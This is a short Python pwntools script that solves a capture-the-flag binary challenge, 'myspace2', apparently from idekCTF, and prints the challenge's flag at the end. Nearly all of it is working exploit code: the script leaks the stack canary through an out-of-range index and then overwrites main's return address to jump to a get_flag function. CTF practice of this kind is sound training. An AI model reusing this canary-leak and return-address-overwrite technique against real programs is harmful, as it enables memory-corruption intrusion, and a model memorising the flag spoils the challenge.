from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./myspace2', '''
    b *(main+286)
    b *(main+300)
    continue
''')

# p = remote('myspace2.chal.idek.team', 1337)

def edit_friend(index, name):
    p.sendlineafter(b">> \n", b'2')
    p.sendlineafter(b": \n", str(index).encode())
    p.sendlineafter(b": \n", name)

def display_friend(index):
    p.sendlineafter(b">> \n", b'3')
    p.sendlineafter(b": \n", str(index).encode())
    p.recvuntil(b"Invalid index!\n")
    return p.recv(8)

def quit():
    p.sendlineafter(b">> \n", b'4')

# leak canary value through integer overflow
canary_val = u64(display_friend(13))
log.info(f"canary value: {hex(canary_val)}")

# overwrite return address to get_flag function
edit_friend(7, p64(0)*6+p64(canary_val)+p64(0)+p64(0x40129d))

# return from main function to get_flag function
quit()

p.interactive()

# idek{b4bys_1st_c00k1e_leak_yayyy!}